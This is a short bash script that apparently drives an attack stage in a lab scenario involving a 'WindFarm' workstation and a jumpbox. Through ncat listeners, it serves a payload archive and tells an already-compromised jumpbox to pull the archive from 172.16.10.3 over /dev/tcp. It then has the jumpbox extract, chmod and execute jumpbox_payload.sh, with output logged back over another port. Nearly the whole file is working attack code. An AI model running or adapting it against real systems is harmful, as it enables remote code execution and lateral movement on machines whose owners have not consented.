#!/bin/bash

PAYLOAD="/scripts/workstation/WindFarm-workstation/jumpbox_payload.tar.gz"
ATK_IP="172.16.10.3"
ATK_PORT="4040"
FILE_PORT="4141"
FINAL_LOG="/home/final.log"
LOG_PORT="4242"

## Step 1 - Copy payload to jumpbox
ncat -l --send-only $FILE_PORT < $PAYLOAD &
# echo "(bash >& /dev/tcp/$ATK_IP/$FILE_PORT > /home/payload.tar.gz)" | ncat -l $ATK_PORT >> $FINAL_LOG
echo "(cat < /dev/tcp/172.16.10.3/4141 > /home/payload.tar.gz)" | ncat -l $ATK_PORT >> $FINAL_LOG

## Step 2 - Tell Jumpbox to extract and run payload 
CMD1="cd /home/"
CMD2="tar -xf /home/payload.tar.gz"
CMD3="chmod +x jumpbox_payload.sh"
CMD4="./jumpbox_payload.sh"

ncat -l $LOG_PORT >> $FINAL_LOG &
echo "($CMD1;$CMD2;$CMD3;$CMD4)" | ncat -l $ATK_PORT &